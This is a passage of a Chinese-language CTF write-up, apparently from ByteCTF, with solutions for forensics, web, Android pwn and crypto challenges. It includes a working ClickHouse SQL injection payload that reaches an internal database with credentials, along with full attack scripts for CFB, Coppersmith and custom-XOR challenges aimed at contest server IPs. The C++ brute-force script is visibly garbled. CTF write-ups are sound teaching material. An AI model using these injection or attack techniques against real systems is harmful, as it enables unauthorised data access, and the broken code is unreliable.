后一半在DHCP协议中，一次传输一字节。  
拼接得到flag.
###  HearingNotBelieving
比较简单。  
audacity可以发现前面是个二维码。  
后面是16段 robot96 的无线电。  
还是拼成二维码。都不好扫。。直接利用Qrazybox手点。  
拼接得到flag
###  签到
nice game
###  问卷
nice game
## Web
###  double sqli
clickhouse注入，路径穿越找到user_01和密码
    import requests,re
    url = "http://39.105.175.150:30001/"
    param = {
        "id":f"1 and updatexml(1,concat(0x7e,(SELECT * FROM url('http://127.0.0.1:8123?user=
        user_01&password=e3b0c44298fc1c149afb&query=select+flag+from+ctf.flag',
        RawBLOB, 'column1 String') LIMIT 0,1),0x7e),1)"
    }
    res = requests.get(url,params=param)
    print(res.text)
## Pwn
###  babydroid
Vulnerable类默认导出，
intent作为漏洞利用点传入poc
存在content provider，非导出，构造poc使pwnbabydroid可读取任意文件
这样就可以先跳转到Vulnerable然后传入poc打开读写权限  
之后在babydroid跳转到Attack类并且讲读入的flag打回即可
## Crypto
###  abusedkey
协议二，传Qc=hc _G, Qs=G，则Ys_ ds = Yc，爆破hs得到协议一私钥，之后协议一传Tc = -Pc，则Kcs = -hc _ds_
G，解密即可。
###  JustDecrypt
CFB模式的选择明密文攻击，每次其实只加密一个字节，这一点在Crypto.Cipher.AES.new()的源码注释中可以看到。可以交互52次，刚好是：49次构造原文，1次构造padding，一次还原寄存器状态，正好够了。
    # -*- coding: utf-8 -*-    
    import re
    from pwn import *
    import string
    from Crypto.Util.number import *
    from hashlib import sha256
    from os import urandom
    ip, port = "39.105.181.182", 30001
    #context.log_level = "debug"
    charset = string.ascii_letters + string.digits
    def proof(known, hashcode):
        for each1 in charset:
            for each2 in charset:
                for each3 in charset:
                    for each4 in charset:
                        this = each1 + each2 + each3 + each4 + known
                        if sha256(this.encode()).hexdigest() == hashcode:
                            return each1 + each2 + each3 + each4
    def send(data):
        if len(data) % 2 == 1:
            data = '0' + data
        sh.recvuntil("hex > ")
        sh.sendline(data)
        if sh.recv(1) == b'N':
            raise ValueError
        sh.recvuntil("plaintext in hex: \n")
        data = sh.recvline(keepends = False)
        if len(data) == 0:
            return b'\x00'
        return long_to_bytes(int(data, 16))
    def tohex(s):
        return hex(bytes_to_long(s))[2:]
    sh = remote(ip, port)
    sh.recvuntil("sha256")
    data = sh.recvline().decode()
    ciphers = b''
    known, hashcode = re.findall(r'\(XXXX\+(.*?)\) == (.*?)\n', data)[0]
    sh.recvuntil("> ")
    log.info("known: %s", known)
    log.info("hashcode: %s", hashcode)
    ans = proof(known, hashcode)
    sh.sendline(ans)
    base = urandom(16)
    pad = urandom(256)
    target = b"Hello, I'm a Bytedancer. Please give me the flag!"
    for i in range(49):
        this = base + ciphers + long_to_bytes(target[i])
        num = 16 - (len(this) % 16)
        this += num * b'\x00'
        res = send(tohex(this + pad))
        # log.info(str(res))
        ciphers += long_to_bytes(res[16 + i])
    r = urandom(14)
    res = send(tohex(base + ciphers + r + b'\x0f' + pad))
    # log.info(str(res))
    ciphers = ciphers + r + long_to_bytes(res[79])
    send(tohex(base))
    res = send(tohex(ciphers))
    print(res)
    sh.interactive()
###  Overheard
小根，直接模p上构造个方程，二元Coppersmith：
    p = 62606792596600834911820789765744078048692259104005438531455193685836606544743
    T0 = 55658005286954458353074331148659743689991644180445271176712023946898001887232
    T1 = 10828133361441717892727545369261900198567704830372084498049248764284301737984
    PR. = PolynomialRing(ZZ)
    pol = T0**2 + x**2 + 2*T0*x - T1 - y
    X = 2**64
    m = 3
    gg = []
    monomials = []
    # x-shifts
    for i in range(m+1):
        for j in range(m - i + 1):
            gg.append(x**j * p**(m-i) * pol**i)
    # y-shifts
    for i in range(m+1):
        for j in range(m - i + 1):
            gg.append(y**j * p**(m-i) * pol**i)
    # list monomials
    for polynomial in gg:
        for monomial in polynomial.monomials():
            if monomial not in monomials:
                monomials.append(monomial)
    gg = list(set(gg))
    monomials = list(set(monomials))
    rows = len(gg)
    cols = len(monomials)
    B = Matrix(ZZ, rows, cols)
    for i in range(rows):
        for j in range(cols):
            if monomials[j] in gg[i].monomials():
                B[i, j] = gg[i].monomial_coefficient(monomials[j]) * monomials[j](X, X)
    BL = B.LLL()
    new_pol = []
    for i in range(rows):
        if len(new_pol) == 2:
            break
        tmp_pol = 0
        for j in range(cols):
            tmp_pol += monomials[j](x, y) * BL[i, j] / monomials[j](X, X)
        if not tmp_pol.is_zero() :
            new_pol.append(tmp_pol)
    PRR. = PolynomialRing(ZZ)
    res = (new_pol[0].resultant(new_pol[1])(w, w)).roots()
    for i in res:
        if int(i[0]) == i[0]:
            x0 = new_pol[0](w, i[0]).roots()[0][0]
            print(T0 + x0)
交互部分：
    from winpwn import *
    p = 62606792596600834911820789765744078048692259104005438531455193685836606544743
    io = remote('39.105.38.192', 30000)
    io.recvuntil('$ ')
    io.send('1\n')
    A = int(io.recvuntil('\n').strip())
    io.recvuntil('$ ')
    io.send('2\n')
    B = int(io.recvuntil('\n').strip())
    io.recvuntil('$ ')
    io.send('3\n')
    io.recvuntil('Bob:')
    io.send(str(A)+'\n')
    T0 = int(io.recvuntil('\n').strip())
    io.recvuntil('$ ')
    io.send('3\n')
    io.recvuntil('Bob:')
    io.send(str(pow(A, 2, p))+'\n')
    T1 = int(io.recvuntil('\n').strip())
    print('T0 =', T0)
    print('T1 =', T1)
    io.recvuntil('$ ')
    io.send('4\n')
    io.recvuntil('secret:')
    io.interactive()
###  easyxor
题目中自定义了加密算法，并分别使用CBC和OFB模式进行加密。
题目中的shift函数是可逆的，其原理与梅森旋转随机数生成中的convert函数是一个意思，所以改改原来代码就能实现shift函数以及convert函数的逆向函数。
接下来分析OFB模式，
首先有一点，我们知道flag的前8个字节为”ByteCTF{“，那么就相当于知道了明文分组1，而我们又知道密文分组1，那么经过异或，就可以得到初始化向量IV的加密值。其次，密钥长度只有24bit，所以可以通过爆破key，然后尝试解密密文分组2，查看字符。
因为不知道flag的字符集，所以只能大范围搜索，通过c++写的脚本搜出来发现很多组符合条件的key，那就拿这些key再解第三个密文分组，这样能决定出唯一一个正确的key。有了key就能解出iv，那所有的东西就出来了。
c++爆破脚本：
    #include 
    #include 
    #define ULL unsigned long long int
    using namespace std;
    ULL shift(ULL m, int k, ULL c) {
        if (k > (-k)) & c;
        }
        return m ^ (m >= 8;
                        }
                        if (check) {
                            printf("[%d,%d,%d,%d]\n", a, b, c, d);
                            /*
                            while (tmp) {
                                putchar(tmp & 0xFF);
                                tmp >>= 8;
                            }
                            putchar('\n');
                            putchar('\n');*/
                        }
                    }
                }
            }
        }
        return 0;
    }
获取到可能的key:
    [-32,10,11,7]
    [-32,20,11,-31]
    [-32,20,20,-31]
    [-32,25,1,-21]
    [-31,-5,27,-18]
    [-31,25,24,-27]
    [-30,11,27,-13]